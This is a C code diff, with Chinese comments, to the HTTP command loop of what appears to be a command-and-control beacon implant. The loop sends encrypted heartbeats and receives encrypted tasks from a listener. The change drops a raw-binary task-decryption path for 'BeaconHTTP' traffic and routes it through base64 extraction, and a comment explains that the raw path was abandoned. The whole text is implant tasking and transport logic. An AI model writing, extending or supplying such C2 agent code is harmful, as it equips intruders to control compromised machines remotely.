@@ -923,7 +923,7 @@ static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, si
                 if (https_send(ws, current_uri, current_ua,
                                https_pick_header(prof->heartbeat_header, hb_idx++),
                                (const char*)beat_buf,
-                               encrypted, enc_len, prof->is_raw_http) != 0) {
+                               encrypted, enc_len, 0) != 0) {
                     ax_free(encrypted);
                     mp_writer_free(&obj_collector);
                     return -1;
@@ -948,39 +948,13 @@ static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, si
             }
 
             if (recv_len > 0) {
-                if (prof->is_raw_http) {
-                    // BeaconHTTP：模板槽里填的是原始密文，按偏移切出来直接解密。
-                    // 无任务时服务端把槽替换成空串，切片长度正好为 0。
-                    // （pre/size 为 0 的兜底：把整个 body 当密文试一次，GCM
-                    //   tag 对不上自然失败跳过，无害。）
-                    size_t raw_len = 0;
-                    const uint8_t* raw = (const uint8_t*)0;
-                    if (ans_pre_size >= 0 && ans_size >= 0 &&
-                        recv_len > (size_t)ans_pre_size &&
-                        recv_len >= (size_t)ans_pre_size + (size_t)ans_size) {
-                        raw = recv_data + ans_pre_size;
-                        raw_len = recv_len - (size_t)ans_pre_size - (size_t)ans_size;
-                    }
-                    if (raw && raw_len > 0) {
-                        size_t plain_len;
-                        uint8_t* possible_plain;
-                        if (session_key_len >= 32)
-                            possible_plain = gopher_decrypt_nogcm(raw, raw_len,
-                                                                 session_key, session_key_len, &plain_len);
-                        else
-                            possible_plain = aes128_gcm_decrypt(raw, raw_len,
-                                                               session_key, &plain_len);
-                        if (possible_plain) {
-                            plaintext = possible_plain;
-                            if (parse_message(plaintext, plain_len, &msg_type, &objects, &obj_sizes, &obj_count) != 0) {
-                                ax_free(plaintext);
-                                plaintext = (uint8_t*)0;
-                                msg_type = 0;
-                                obj_count = 0;
-                            }
-                        }
-                    }
-                } else {
+                // ★ BeaconHTTP (is_raw_http) 也走 b64 提取：服务端
+                // beacon_listener_http 对「b64 body 的 agent」同样以 b64 回填
+                // 模板槽（2026-11-07），与 WS/HTTPS 家族的 wire 完全一致。
+                // 早期的 raw-binary 槽实验已放弃 —— core 给该路径产出的任务
+                // 密文与 agent 会话密钥对不上（根因未定位），b64 路径是
+                // end-to-end 验证过的。
+                {
                 uint8_t* b64_start = recv_data;
                 size_t b64_len = recv_len;
                 extract_b64_payload(recv_data, recv_len, ans_pre_size, ans_size, &b64_start, &b64_len);
